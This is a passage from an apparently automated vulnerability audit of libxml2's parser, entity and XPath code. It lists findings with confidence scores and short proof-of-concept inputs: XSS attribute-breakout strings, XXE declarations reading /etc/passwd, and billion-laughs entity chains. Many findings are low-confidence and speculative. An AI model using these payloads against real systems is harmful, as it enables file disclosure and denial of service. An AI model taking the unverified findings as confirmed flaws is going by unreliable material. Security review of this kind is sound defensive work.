When handling XML_NAMESPACE_DECL nodes, the code casts xmlNsPtr to xmlNodePtr and returns ns->next as an ancestor if its type is not XML_NAMESPACE_DECL. The xmlNs and xmlNode structures have different memory layouts beyond the type field. If ns->next points to another xmlNs node whose type field has been corrupted or is not XML_NAMESPACE_DECL, it will be returned as xmlNodePtr, causing type confusion. Subsequent code operating on the returned pointer will interpret xmlNs fields (href, prefix, _private, context) as xmlNode fields (name, children, last, parent, next, prev, doc), potentially lead…

*PoC sketch:* Craft an XML document with namespace declarations where the namespace linked list is corrupted (e.g., via a separate memory corruption bug or by manipulating the tree via API to have an xmlNs node with a non-XML_NAMESPACE_DECL type value), then evaluate an XPath ancestor:: axis traversal starting fr…

### `libxml2/parser.c [xmlParseStartTag2 B: attrib accumulator L9095-9215]` — L9194 — conf=0.65
**Heap buffer overflow via attallocs out-of-bounds write**

The write to `ctxt->attallocs[nratts++]` is indexed by `nratts` (attribute count), while the growth check at line 9189 is based on `nbatts` (slot count, 5 per attribute). If `xmlCtxtGrowAttrs` does not correctly size the `attallocs` array proportionally to `maxatts/5`, or if there is any inconsistency between how `nratts` and `nbatts` are maintained (e.g., namespace attributes incrementing one counter but not the other in edge cases), this write can go out of bounds. The stored value includes a controlled hash value and allocation flag, making heap corruption exploitable.

*PoC sketch:* Craft an XML document with a large number of regular attributes (not namespace declarations) to fill the attallocs buffer. If the array is undersized relative to nratts, the write at ctxt->attallocs[nratts++] will overflow: <root a1='v1' a2='v2' ... aN='vN'> where N exceeds attallocs capacity.


## 🟡 MEDIUM (36)

### `libxml2/entities.c [entity content handling+value encode L562-726]` — L572 — conf=0.9
**Missing entity encoding inside HTML SSI/comment branch allows attribute injection**

When processing HTML attributes containing `<!--...-->` server-side includes, all content between `<!--` and `-->` is copied verbatim without any entity encoding. Characters like `"`, `<`, `>`, and `&` pass through unencoded. An attacker who can inject `<!--` into an attribute value can include unencoded double-quotes to break out of the attribute context, leading to XSS or attribute injection.

*PoC sketch:* Input: <!--" onmouseover="alert(1)--> Output: <!--" onmouseover="alert(1)--> In context: <div title="<!--" onmouseover="alert(1)-->">  — attribute breakout + XSS

### `libxml2/entities.c [entity content handling+value encode L562-726]` — L600 — conf=0.9
**Missing entity encoding inside HTML &{...} branch allows attribute injection**

When processing HTML attributes containing the `&{...}` construct (HTML 4 script entity), all content between `&{` and `}` is copied verbatim without entity encoding. Special characters including `"`, `<`, `>`, and `&` pass through unencoded. An attacker can inject `&{` followed by a double-quote and arbitrary attributes to break out of the attribute context.

*PoC sketch:* Input: &{" onclick="alert(1)} Output: &{" onclick="alert(1)} In context: <div title="&{" onclick="alert(1)}">  — attribute breakout + XSS

### `libxml2/parser.c [xmlParseAttValueInternal A: attrib decode L4303-4420]` — L4360 — conf=0.85
**Continued parsing after fatal error on '<' in attribute value**

When a '<' character is encountered inside an attribute value, `xmlFatalErr()` is called but the code does NOT break, flush, or skip the character. Instead, it falls through to `chunkSize += 1` (line 4364), adding the '<' to the output chunk and continuing parsing. Although `PARSER_STOPPED` is checked at the top of the next loop iteration, between the fatal error and that check, the parser continues processing in an inconsistent state. The '<' is silently included in the attribute value output, which could lead to injection or parsing confusion in downstream consumers that trust libxml2's well…

*PoC sketch:* <a attr="val<ue"/> — The '<' triggers xmlFatalErr but is still accumulated into chunkSize and included in the parsed attribute value output, bypassing well-formedness enforcement.

### `libxml2/parser.c [xmlParseStartTag2 D: ns expand+attrib dedup L9340-9460]` — L9403 — conf=0.85
**Missing 'else' keyword in default attribute namespace resolution**

There is a missing 'else' keyword between the first `if (aprefix == NULL)` block and the subsequent `if (aprefix == ctxt->str_xml)` block in the default attributes namespace resolution logic. The code reads `} if (aprefix == ctxt->str_xml)` instead of `} else if (aprefix == ctxt->str_xml)`. This means the second `if` is evaluated independently even when `aprefix == NULL`. Under normal conditions this produces the same result, but if `ctxt->str_xml` were NULL (e.g., due to memory corruption or incomplete parser initialization), both blocks would execute when `aprefix == NULL`, causing the attri…

*PoC sketch:* Craft an XML document with default attributes (from DTD/Schema) that have no prefix (aprefix == NULL). If the parser context's str_xml pointer is corrupted to NULL through a separate memory corruption bug, the missing else would cause unprefixed default attributes to be incorrectly resolved to the X…

### `libxml2/xpath.c [xmlXPathNextAncestor: ancestor axis traversal L6954-7060]` — L6976 — conf=0.85
**NULL Pointer Dereference via unchecked parent->name access**

When checking if the parent element is a 'fake node libxslt', the code accesses parent->name[0] without verifying that name is not NULL. While element nodes typically have non-NULL names, a corrupted or specially crafted tree could have an element node with a NULL name, causing a crash. This same pattern appears twice: once in the cur==NULL path (lines 6976-6978) and once in the cur!=NULL path (lines 7021-7023). The xmlStrEqual call on the same name would also dereference NULL.

*PoC sketch:* Craft an XML document tree (via API) where an element node has parent->type == XML_ELEMENT_NODE but parent->name == NULL, then evaluate an XPath expression using the ancestor:: axis against a child of that element.

### `libxml2/entities.c [entity value escaping+output+cleanup L726-908]` — L760 — conf=0.85
**Missing single quote escaping in xmlEncodeSpecialChars enables XML/attribute injection**

The xmlEncodeSpecialChars function escapes <, >, &, ", and \r, but does NOT escape the single quote character ('), despite ' being a predefined XML entity (&apos;). If the encoded output is placed into an XML attribute value delimited by single quotes (e.g., attr='ENCODED_VALUE'), an attacker can inject a single quote to break out of the attribute context and inject arbitrary attributes or XML content, leading to XSS or XML injection.

*PoC sketch:* Input: foo'onclick='alert(1) — Output remains: foo'onclick='alert(1). When placed in <elem attr='foo'onclick='alert(1)'>, the browser/parser interprets onclick as a separate attribute, executing the JavaScript.

### `libxml2/parser.c [xmlParseCharRef: char ref decoder L2578-2750]` — L2670 — conf=0.8
**Buffer over-read in xmlParseStringCharRef due to missing null/bounds check**

The while loops in xmlParseStringCharRef iterate until a semicolon is found (`while (cur != ';')`) without checking for null terminators or string boundaries. If a malformed string is passed that contains `&#x` or `&#` but lacks a closing semicolon, and the subsequent bytes happen to be valid hex/decimal digits (e.g., from adjacent memory), the loop will continue reading past the intended buffer boundary. While a null byte (0x00) would eventually terminate the loop by falling through to the else branch, non-null garbage data that matches [0-9a-fA-F] would be processed, potentially reading far …

*PoC sketch:* Provide a string like "&#x41414141" (no semicolon) where the memory immediately after the string contains bytes in the ranges 0x30-0x39, 0x41-0x46, or 0x61-0x66. The loop will continue reading and processing these bytes as hex digits until a non-hex byte or semicolon is encountered, leaking memory c…

### `libxml2/parser.c [xmlParseEntityDecl A: decl entry+type L5698-5800]` — L5729 — conf=0.8
**Entity name with colon not rejected - continues processing**

When an entity name contains a colon (':'), xmlNsErr reports an error but the function does not return or set name to NULL. The entity with the invalid colon-containing name continues to be processed and registered via the SAX entityDecl callback. Colons in entity names are forbidden because they can cause namespace confusion. An attacker can exploit this to create entities that conflict with namespace-prefixed names, potentially leading to entity expansion attacks or XXE bypass in applications that rely on the name validation.

*PoC sketch:* <!DOCTYPE foo [<!ENTITY prefix:name "value">]>  -- Colon in entity name is reported as error but entity is still registered

### `libxml2/parser.c [xmlParseEntityDecl B: value+system L5800-5920]` — L5828 — conf=0.8
**Missing NULL Check for ndata Before Passing to SAX Handler**

xmlParseName() can return NULL if the input is malformed (e.g., NDATA followed by a non-name character). The returned ndata value is passed directly to ctxt->sax->unparsedEntityDecl() without any NULL check. If the SAX handler does not handle NULL ndata gracefully, this results in a NULL pointer dereference causing a denial of service (crash). Even if the handler does check, passing NULL for a required notation name violates the API contract.

*PoC sketch:* <?xml version="1.0"?> <!DOCTYPE foo [   <!ENTITY unp NDATA > ]> <foo/> -- After 'NDATA', if no valid name follows, xmlParseName returns NULL, which is passed to unparsedEntityDecl causing a potential crash.

### `libxml2/parser.c [xmlParseStartTag2 C: ns URI lookup L9215-9340]` — L9303 — conf=0.8
**Infinite loop in hash table size calculation (Denial of Service)**

The loop `while (attrHashSize / 2 < (unsigned) maxAtts) attrHashSize *= 2;` can enter an infinite loop when (unsigned) maxAtts is very large (e.g., >= 0x40000001). When attrHashSize reaches 0x80000000 and doubles, it wraps to 0 on 32-bit unsigned arithmetic. Then 0/2 = 0 < maxAtts remains true, and 0*2 = 0, creating an infinite loop. This can be triggered by the integer overflow in maxAtts making it negative, which when cast to unsigned becomes a very large value.

*PoC sketch:* Provide input where nratts + nbTotalDef overflows to a negative integer. When cast to unsigned in the comparison, this becomes a value >= 2^31, causing the doubling loop to eventually wrap attrHashSize to 0 and loop forever.

### `libxml2/xpath.c [xmlXPathNextAncestor: ancestor axis traversal L6954-7060]` — L6999 — conf=0.8
**NULL Pointer Dereference via unchecked doc pointer**

The code accesses ctxt->context->doc->children without checking whether ctxt->context->doc is NULL. If an XPath evaluation is performed on a context where the document pointer is NULL, this will cause a segmentation fault. The subsequent line also dereferences doc without a NULL check.

*PoC sketch:* Create an xmlXPathContext with node set but doc set to NULL, then evaluate an XPath expression using the ancestor axis that traverses up to the document root.

### `libxml2/xpath.c [xmlXPathSubstringAfter+Normalize+Translate L8200-8336]` — L8318 — conf=0.8
**OpLimit bypass via underestimated quadratic cost in translate()**

The xmlXPathTranslateFunction applies an operation limit check to prevent quadratic runtime DoS. However, it divides both string lengths by 10 before multiplying (f1 = f1/10+1; f2 = f2/10+1; p = f1*f2), underestimating the actual computational cost by approximately 100x. The translate() function has O(len(from)*len(str)) complexity, but the estimated cost is roughly (len/10)*(len/10) = len^2/100. An attacker can craft XPath expressions with long 'from' and 'str' arguments that pass the opLimit check but still cause significantly longer computation than intended, enabling denial of service.

*PoC sketch:* If opLimit is set to 1,000,000, an attacker could use translate() with from and str strings of length ~31,600 each. The estimated cost would be (3160+1)*(3160+1) ≈ 10M, which exceeds the limit. But with length ~10,000 each, estimated cost is (1000+1)*(1000+1) ≈ 1M (passes), while actual operations a…

### `libxml2/parser.c [xmlParseEntityValue A: entity literal L3870-4032]` — L3907 — conf=0.75
**Missing Length Validation in Entity Value Parsing Loop**

The while loop in `xmlParseEntityValue` that counts the raw entity value length has no upper bound check on `length` itself. The `maxLength` parameter is only applied to the output SBuf (expanded content), not the raw input scanning loop. An attacker can supply an extremely long entity literal (e.g., hundreds of MB or GB of data between quotes with no entity references) that passes the loop without triggering any size limit, consuming excessive memory when `xmlStrndup(start, length)` allocates a copy of the entire raw value. This is distinct from the integer overflow issue — even before overfl…

*PoC sketch:* <!DOCTYPE doc [<!ENTITY foo "AAAAAAAAAA...(hundreds of MB of A's without any entity references)...">]><doc>&foo;</doc>. The parser will allocate memory for the full raw entity value via xmlStrndup without any intermediate size check on the raw length.

### `libxml2/parser.c [xmlParseCharDataInternal: CDATA + text L4775-4910]` — L4815 — conf=0.75
**Null pointer dereference on ctxt->space**

The code dereferences `ctxt->space` without a NULL check in two locations: `if (*ctxt->space == -1) *ctxt->space = -2;`. If `ctxt->space` is NULL (which can occur in certain error conditions or with malformed input that causes the space stack to be improperly initialized or underflow), this results in a null pointer dereference causing a crash (denial of service). The space pointer is part of the parser's internal element stack and may become invalid if the stack is corrupted or empty due to malformed XML input.

*PoC sketch:* Provide malformed XML input that causes the parser's space stack to underflow or become NULL before character data is encountered. For example, XML with character data in an unexpected parsing state where no element context has been properly established could trigger this crash.

### `libxml2/parser.c [xmlParseEntityDecl B: value+system L5800-5920]` — L5813 — conf=0.75
**Continued Processing After URI Fragment Fatal Error Enables Entity Injection**

When xmlFatalErr is called for a URI fragment violation (line 5816), it sets error state but does NOT call xmlHaltParser(). The parser continues executing, proceeding through NDATA checks, SAX callbacks, and the expat compatibility path. Unlike the entity-not-terminated case (line 5871 which calls xmlHaltParser), the fragment error allows full processing of the malformed entity declaration. This inconsistent error handling means security-relevant validation (fragment check) can be bypassed because subsequent code still executes with the invalid URI.

*PoC sketch:* <?xml version="1.0"?> <!DOCTYPE foo [   <!ENTITY ext SYSTEM "file:///etc/passwd#x"> ]> <foo>&ext;</foo> -- xmlFatalErr is called for the '#' but xmlHaltParser is NOT called, so the entity declaration is fully processed and registered.

### `libxml2/xpath.c [xmlXPathCompareValues: type coercion compare L6299-6415]` — L6337 — conf=0.75
**Missing error check between type coercions leads to NULL dereference/use-after-free**

The code performs two sequential type coercions (arg1 then arg2) via xmlXPathNumberFunction but only checks ctxt->error AFTER both conversions. If the first conversion fails (e.g., due to OOM), valuePop may return NULL for arg1. The second conversion still executes on a potentially corrupted stack state. When the error is finally detected, the error cleanup path calls xmlXPathReleaseObject(ctxt->context, arg1) where arg1 may be NULL or point to freed memory. Additionally, if the first number function consumed arg1 from the stack but failed to push a replacement, the second number function oper…

*PoC sketch:* Craft an XPath expression that forces type coercion on a value that causes xmlXPathNumberFunction to fail (e.g., by exhausting memory during conversion of a string to number). For example: evaluate an XPath expression like '"large_string" < 1' where the string conversion triggers an allocation failu…

### `libxml2/xpath.c [xmlXPathCurrentChar+ParseNameComplex A L8698-8855]` — L8726 — conf=0.75
**Missing Overlong UTF-8 Encoding Rejection in xmlXPathCurrentChar**

The xmlXPathCurrentChar function does not validate against overlong UTF-8 encodings. For example, the 2-byte sequence 0xC0 0xAF decodes to U+002F ('/'), and 0xC0 0x80 decodes to U+0000 (NUL). Overlong encodings allow representing the same character with more bytes than necessary. An attacker can use overlong encodings to bypass input validation or sanitization that operates on raw bytes rather than decoded character values. For instance, a filter checking for '/' in raw bytes would miss 0xC0 0xAF, but xmlXPathCurrentChar would decode it as '/', potentially leading to XPath injection or path tr…

*PoC sketch:* Supply an XPath expression containing the overlong encoding of a sensitive character. For example, 0xC0 0xAF as an overlong encoding of '/' could bypass byte-level filters: xpath = "//node[@attr=" + user_input + "]" where user_input contains 0xC0 0xAF to represent '/' and bypass path restrictions.

### `libxml2/entities.c [xmlGetDocEntity+DtdEntity: lookup chain L286-430]` — L367 — conf=0.75
**Missing NULL name check in xmlNewEntity when doc->intSubset exists**

In xmlNewEntity(), the NULL check for 'name' (line 374) is only reached in the else branch — i.e., when doc is NULL or doc->intSubset is NULL. If doc is non-NULL and doc->intSubset is non-NULL, execution takes the early return path via xmlAddDocEntity() without ever validating that 'name' is not NULL. A NULL name would be passed down to xmlAddEntity(), which may dereference it during hash table insertion or string operations, leading to a NULL pointer dereference and crash (denial of service).

*PoC sketch:* xmlDocPtr doc = xmlNewDoc(BAD_CAST "1.0"); xmlCreateIntSubset(doc, BAD_CAST "root", NULL, NULL); /* name is NULL, but doc->intSubset is non-NULL, so NULL check is bypassed */ xmlEntityPtr ent = xmlNewEntity(doc, NULL, XML_INTERNAL_GENERAL_ENTITY, NULL, NULL, BAD_CAST "content"); /* This calls xmlAdd…

### `libxml2/parser.c [xmlParseEntityValue B: entity expansion L4032-4168]` — L4085 — conf=0.7
**Entity amplification check bypassed when check parameter is false**

The xmlParserEntityCheck (which enforces entity expansion size limits) is only called when the `check` parameter is true. If xmlExpandEntityInAttValue is invoked from a code path where `check` is false, there is no size limit enforcement on entity expansion. Combined with the broken circular reference detection (finding #1), this could allow a billion laughs style attack to proceed without any size constraint, limited only by the depth counter. The depth limit alone is insufficient to prevent exponential amplification — with fan-out of 10 and depth 20, expansion can reach 10^20 characters.

*PoC sketch:* <?xml version="1.0"?> <!DOCTYPE doc [   <!ENTITY x0 "test">   <!ENTITY x1 "&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;">   <!ENTITY x2 "&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;">   <!ENTITY x3 "&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;">   <!ENTITY x4 "&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;">   <!ENTI…

### `libxml2/parser.c [xmlParseAttValueInternal B: entity in attrib L4420-4535]` — L4488 — conf=0.7
**Length/Content Mismatch After Entity Content Nullification**

After ent->content[0] is set to 0, ent->length retains its original value. Any subsequent code that uses ent->length to determine how many bytes to read from ent->content will read past the null terminator, potentially leaking heap data or causing out-of-bounds reads. While the immediate code path goes to 'goto error', the corrupted entity object persists in the entity hash table and can be accessed by later parsing operations or SAX callbacks that trust ent->length to reflect the actual content size.

*PoC sketch:* Same as above - after the entity content is zeroed, any code path that does memcpy(dst, ent->content, ent->length) or equivalent will read ent->length bytes starting from ent->content, which is now an empty string, causing a heap over-read of ent->length - 1 bytes beyond the null terminator.

### `libxml2/parser.c [xmlParseEntityDecl B: value+system L5800-5920]` — L5813 — conf=0.7
**URL-Encoded Fragment Bypass in URI Validation**

The URI fragment check uses xmlStrchr(URI, '#') which only detects literal '#' characters. A URL-encoded fragment such as '%23' would bypass this check entirely. If the URI is later decoded by the entity loader or downstream consumers, the fragment would be interpreted, potentially allowing SSRF, local file inclusion with fragment identifiers, or bypassing URI-based security policies that rely on this validation.

*PoC sketch:* <?xml version="1.0"?> <!DOCTYPE foo [   <!ENTITY xxe SYSTEM "http://target/resource%23fragment"> ]> <foo>&xxe;</foo> -- The '%23' bypasses xmlStrchr(URI, '#') check, but may be decoded to '#' by URI resolution logic downstream.

### `libxml2/entities.c [xmlCreateEntity+xmlAddEntity: create+insert L1-155]` — L131 — conf=0.7
**Missing NULL check for 'name' parameter before xmlDictLookup**

In xmlCreateEntity, the 'name' parameter is passed directly to xmlDictLookup(doc->dict, name, -1) without a NULL check when doc->dict is non-NULL. If name is NULL, xmlDictLookup may dereference a NULL pointer, causing a crash (denial of service). The xmlStrdup path for when dict is NULL would also pass NULL to xmlStrdup, which in libxml2 returns NULL for NULL input and would be caught by the subsequent NULL check, but the xmlDictLookup path may not handle NULL gracefully.

*PoC sketch:* Craft an XML document or API call that triggers xmlCreateEntity with name=NULL and a doc that has a non-NULL dict. This could occur through malformed entity declarations in DTDs.

### `libxml2/entities.c [xmlCreateEntity+xmlAddEntity: create+insert L1-155]` — L127 — conf=0.65
**No validation of entity type parameter leading to type confusion**

The 'type' parameter (int) is cast directly to xmlEntityType via 'ret->etype = (xmlEntityType) type' without any bounds or validity checking. If an invalid or out-of-range type value is supplied, the entity will have an undefined etype. Downstream code that switches on etype (e.g., during entity expansion, serialization, or validation) may fall through to unexpected code paths, potentially leading to type confusion, incorrect memory handling, or security bypasses.

*PoC sketch:* Call xmlCreateEntity with a type value outside the valid xmlEntityType enum range (e.g., a large negative or positive integer). When the entity is later processed, code that assumes etype is valid may exhibit undefined behavior.

### `libxml2/parser.c [xmlParseEntityValue A: entity literal L3870-4032]` — L3968 — conf=0.6
**Unchecked Entity Expansion Size Overflow in Attribute Value Check**

In `xmlCheckEntityInAttValue`, `expandedSize` is declared as `unsigned long` and initialized from `pent->length`. On 32-bit platforms, `unsigned long` is 32 bits. If the entity references other entities whose cumulative expanded size exceeds 2^32, `expandedSize` wraps to a small value, potentially bypassing size limit checks downstream. Even on 64-bit platforms, if the code accumulates sizes from nested entity references without overflow checks, extremely deeply nested or large entity expansions could produce incorrect size estimates, leading to insufficient buffer allocation when the entity i…

*PoC sketch:* Define deeply nested entities where each level multiplies the expansion size: <!ENTITY a "AAAA"> <!ENTITY b "&a;&a;&a;&a;"> <!ENTITY c "&b;&b;&b;&b;"> ... continuing until the cumulative expanded size exceeds 2^32 on a 32-bit system. Reference the outermost entity in an attribute value. The `expande…

### `libxml2/parser.c [xmlParseEntityValue B: entity expansion L4032-4168]` — L4035 — conf=0.6
**Potential null pointer dereference on pent->content in error paths**

When xmlParseStringCharRef returns 0 or xmlParseStringEntityRef returns NULL (error conditions), the code unconditionally writes `pent->content[0] = 0` to create an empty entity value. If a prior memory allocation failure left `pent->content` as NULL, this write causes a null pointer dereference and crash. This is a denial-of-service vulnerability that could be triggered by memory exhaustion conditions combined with malformed entity references.

*PoC sketch:* <?xml version="1.0"?> <!DOCTYPE doc [   <!ENTITY foo "&#x0;"> ]> <doc/> <!-- If memory is exhausted before parsing foo's content,      pent->content could be NULL, and the error path      pent->content[0] = 0 would crash. -->

### `libxml2/parser.c [xmlParseEntityDecl A: decl entry+type L5698-5800]` — L5743 — conf=0.6
**Potential use-after-free via SAX callback with entity value**

The value returned by xmlParseEntityValue() is passed directly to the SAX entityDecl callback. If the SAX handler stores a reference to this value rather than copying it, and the value is later freed in the 'done' cleanup section (not visible but implied by the goto done pattern), a use-after-free occurs when the handler later accesses the stored reference. This pattern is consistent with CVE-2022-23308, where the entity value was freed while still referenced from the entity table. The orig pointer from xmlParseEntityValue also has unclear ownership/lifetime semantics.

*PoC sketch:* <!DOCTYPE foo [<!ENTITY ent "value">]><root>&ent;</root>  -- If SAX handler stores value reference and cleanup frees it, accessing &ent; later triggers UAF

### `libxml2/xpath.c [xmlXPathCompareValues: type coercion compare L6299-6415]` — L6337 — conf=0.6
**Type coercion via xmlXPathNumberFunction can cause object lifetime confusion**

When arg1 is not XPATH_NUMBER, the code pushes arg1 onto the stack, calls xmlXPathNumberFunction(ctxt, 1) which pops and frees the original arg1 object, then assigns arg1 = valuePop(ctxt). If xmlXPathNumberFunction fails after popping but before pushing a new value, the original arg1 is freed but valuePop returns NULL or a stale pointer. The subsequent code may use this dangling pointer. Furthermore, the original arg1 object's memory could be reused, and if valuePop returns a pointer to reused memory, accessing arg1->floatval at line 6351 reads from freed/reallocated memory — a classic use-aft…

*PoC sketch:* 1. Craft XPath with a non-numeric left operand requiring coercion (e.g., a string or boolean). 2. Force xmlXPathNumberFunction to fail mid-conversion (e.g., via memory pressure or a custom XPath context with a faulty number function). 3. The original arg1 object is freed inside xmlXPathNumberFunctio…

### `libxml2/entities.c [xmlAddDtdEntity+NewEntity+GetParameter L430-562]` — L497 — conf=0.6
**Entity lookup bypass in xmlGetDocEntity via standalone flag**

In `xmlGetDocEntity`, when `doc->standalone == 1`, the external subset entities are completely skipped (line ~499: `if (doc->standalone != 1)`). This means an entity defined in the external subset will not be found, and the function falls through to `xmlGetPredefinedEntity(name)`. If an attacker can influence the `standalone` flag (e.g., through a crafted XML declaration `<?xml standalone="yes"?>`), they can cause entity resolution to bypass external subset definitions, potentially leading to entity confusion where a different entity definition is used than expected. This could be leveraged in…

*PoC sketch:* <?xml version="1.0" standalone="yes"?> <!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <root>&xxe;</root>  -- With standalone=yes, external subset entity resolution is skipped, potentially altering entity resolution behavior in unexpected ways depending on where entities are defined.

### `libxml2/parser.c [xmlParseEntityValue B: entity expansion L4032-4168]` — L4054 — conf=0.55
**Saturated expandedSize underestimation leading to insufficient allocation**

The xmlSaturatedAdd function saturates on overflow, capping expandedSize at its maximum value. While this prevents integer overflow, it causes the computed expandedSize to be an underestimate of the actual expansion. If downstream code uses pent->expandedSize (set at line 4060) to allocate buffers or make security decisions, the underestimated size could lead to buffer overflows or bypassed security checks. The saturation silently masks the true expansion cost rather than reporting an error.

*PoC sketch:* <?xml version="1.0"?> <!DOCTYPE doc [   <!ENTITY x0 "AAAAAAAAAA">   <!ENTITY x1 "&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;">   <!-- ... deeply nested with high fan-out to saturate expandedSize ... --> ]> <doc attr="&x1;"/> <!-- expandedSize saturates to max, underestimating true s…

### `libxml2/parser.c [xmlParseCharDataInternal: CDATA + text L4775-4910]` — L4796 — conf=0.55
**Potential use-after-free if SAX callback triggers input buffer reallocation**

In the '<' handling branch, `tmp` is set to `ctxt->input->cur` and then SAX callbacks are invoked with `tmp` as the data pointer. If a SAX callback (e.g., `ignorableWhitespace` or `characters`) triggers additional input reading that causes the input buffer to be reallocated (e.g., via `xmlParserInputGrow`), the `tmp` pointer becomes dangling. The callback would then be reading from freed memory. While standard SAX handlers don't typically trigger reallocation, custom handlers could, making this a potential use-after-free in applications with custom SAX callbacks.

*PoC sketch:* Register a custom SAX characters callback that calls xmlParserInputGrow() on the parser's input buffer, forcing reallocation. The tmp pointer passed to the callback (or used within the callback after reallocation) would reference freed memory.

### `libxml2/parser.c [xmlParseStartTag2 B: attrib accumulator L9095-9215]` — L9207 — conf=0.5
**Stale BASE_PTR offsets causing pointer reconstruction errors**

When `alloc` is false, attribute value pointers are stored as offsets from `BASE_PTR` (lines 9208, 9213). The comment acknowledges the input buffer can be reallocated. If the input buffer is reallocated between storing these offsets and their later reconstruction, `BASE_PTR` will have changed, making the stored offsets stale. Reconstructed pointers would reference incorrect memory locations, potentially leading to out-of-bounds reads or writes during attribute value access. This is especially dangerous if the reallocation occurs mid-attribute processing.

*PoC sketch:* Craft an XML element with attributes whose values span input buffer boundaries, forcing buffer reallocation during parsing: <root a='short' b='value_that_forces_buffer_growth_by_exceeding_input_chunk_size'>

### `libxml2/parser.c [xmlParseStartTag2 C: ns URI lookup L9215-9340]` — L9283 — conf=0.5
**Potential null pointer dereference on ctxt->nsdb access**

The expression `ctxt->nsdb->minNsIndex` is dereferenced without checking if `ctxt->nsdb` is NULL. If the namespace database was not properly initialized (e.g., due to a previous memory allocation failure that was not handled correctly), this would cause a null pointer dereference crash. While nsdb is typically initialized during parser creation, certain error paths could leave it NULL.

*PoC sketch:* Trigger a memory allocation failure during parser initialization that prevents nsdb from being allocated, then parse an element with namespace-prefixed attributes that reach the nsIndex comparison line.

### `libxml2/xpath.c [xmlXPathNodeSetMergeAndClear: merge+dedup L3115-3250]` — L3148 — conf=0.5
**Potential integer overflow in nodeTab reallocation size calculation**

The reallocation computes the new size as set1->nodeMax * 2 * sizeof(xmlNodePtr). While there is a bounds check (set1->nodeMax >= XPATH_MAX_NODESET_LENGTH) before the realloc, if XPATH_MAX_NODESET_LENGTH is defined as a value large enough that set1->nodeMax * 2 * sizeof(xmlNodePtr) overflows a size_t on 32-bit platforms, the realloc would allocate a smaller buffer than expected. The subsequent write at set1->nodeTab[set1->nodeNr++] = n2 would then be a heap buffer overflow. The safety of this code depends entirely on the value of XPATH_MAX_NODESET_LENGTH being small enough to prevent overflow.

*PoC sketch:* On a 32-bit platform where sizeof(xmlNodePtr) = 4 and size_t is 32 bits: if XPATH_MAX_NODESET_LENGTH allows nodeMax to reach ~536870912 (0x20000000), then nodeMax * 2 * 4 = 0x20000000 * 8 = 0x100000000 which overflows to 0, causing xmlRealloc to allocate a tiny or zero-sized buffer while nodeMax is …

### `libxml2/parser.c [xmlParseStartTag2 B: attrib accumulator L9095-9215]` — L9189 — conf=0.45
**Integer overflow in nbatts + 5 bypassing growth check**

The bounds check `nbatts + 5 > maxatts` at line 9189 is susceptible to integer overflow. If `nbatts` is a signed 32-bit integer approaching INT_MAX, adding 5 could overflow to a negative value, which would be less than `maxatts`, bypassing the growth check. Subsequent writes to `atts[nbatts++]` and `ctxt->attallocs[nratts++]` would then occur with out-of-bounds indices, leading to heap corruption. While requiring an extremely large number of attributes (~429M), entity expansion or streaming techniques could amplify attribute counts.

*PoC sketch:* An XML document with hundreds of millions of attributes (potentially via entity expansion amplification) could cause nbatts to approach INT_MAX: <!DOCTYPE x [<!ENTITY e1 "a='1' "> <!ENTITY e2 "&e1;&e1;&e1;..."> ]> <root &e2;>

### `libxml2/parser.c [xmlParseStartTag2 B: attrib accumulator L9095-9215]` — L9197 — conf=0.4
**Type confusion via pointer punning in atts array**

The `atts` array (typed as `const xmlChar **`) stores heterogeneous data: attribute names (pointers), prefixes (pointers), hash values cast to pointers (line 9197: `(const xmlChar *)(size_t) haprefix.hashValue`), direct value pointers (line 9200), and offset-based pseudo-pointers (lines 9208, 9213). This pointer punning creates type confusion risk. If downstream code misinterprets a hash value or offset as a valid string pointer and dereferences it, this causes arbitrary memory reads. The `alloc` flag stored in `attallocs` determines interpretation, but any mismatch leads to type confusion.

*PoC sketch:* If the alloc flag (bit 31 of attallocs entry) is misinterpreted or corrupted, a hash value like 0x41414141 stored at atts[i] would be dereferenced as a string pointer, reading from address 0x41414141.

### `libxml2/parser.c [xmlParseStartTag2 E: attrib flush+end L9460-9570]` — L9487 — conf=0.35
**Integer overflow in memset size for attrHash initialization**

The call memset(ctxt->attrHash, -1, attrHashSize * sizeof(ctxt->attrHash[0])) computes the byte count as attrHashSize * sizeof(ctxt->attrHash[0]). If attrHashSize is attacker-influenced and large enough, this multiplication can overflow on 32-bit platforms (where size_t is 32 bits), resulting in a much smaller memset than intended. This leaves portions of the hash table uninitialized (not set to the -1 sentinel), which can cause the subsequent xmlAttrHashInsertQName to misinterpret uninitialized entries as valid, potentially failing to detect duplicate QName attributes. Undetected duplicate at…

*PoC sketch:* On a 32-bit build, if attrHashSize is crafted such that attrHashSize * sizeof(int) wraps around to a small value, the hash table will be partially initialized. Attributes with colliding hash values in the uninitialized region may not be detected as duplicates, bypassing the duplicate-attribute valid…


## 🔵 LOW (18)

### `libxml2/parser.c [xmlParseCharRef: char ref decoder L2578-2750]` — L2615 — conf=0.85
**Missing PARSER_STOPPED check in decimal character reference parsing loop**

In xmlParseCharRef, the hex parsing loop checks `PARSER_STOPPED(ctxt) == 0` as a loop condition, allowing it to exit gracefully when a fatal error stops the parser. However, the decimal parsing loop (`while (RAW != ';')`) omits this check entirely. If the parser encounters a fatal error during decimal character reference parsing, the loop will continue processing input until it finds a semicolon, ignoring the stop flag. With a very long sequence of decimal digits (e.g., &#111111111111111111111111111111;), this could cause significant continued processing after the parser should have stopped.

*PoC sketch:* Provide input that triggers a fatal parser error followed by a very long decimal character reference: &#99999999999999999999999999999999999999999999999999999999999999999999; The parser will continue iterating through all digits despite being in a stopped state.

### `libxml2/parser.c [xmlParseCharDataInternal: CDATA + text L4775-4910]` — L4840 — conf=0.85
**Incomplete handling of ']]>' sequence in character data**

When the forbidden `]]>` sequence is detected in character data, the code reports a fatal error via `xmlFatalErr()` but only advances `ctxt->input->cur` by 1 byte (`in + 1`), skipping only the first `]`. The remaining `]>` characters are left for re-parsing. This means: (1) the `]>` will be incorrectly treated as regular character data and passed to the application via SAX callbacks despite being part of an error condition, and (2) if the input contains consecutive `]]>` sequences, each one triggers a separate error but only consumes one byte, leading to O(n) error reports for n bytes of `]]>.…

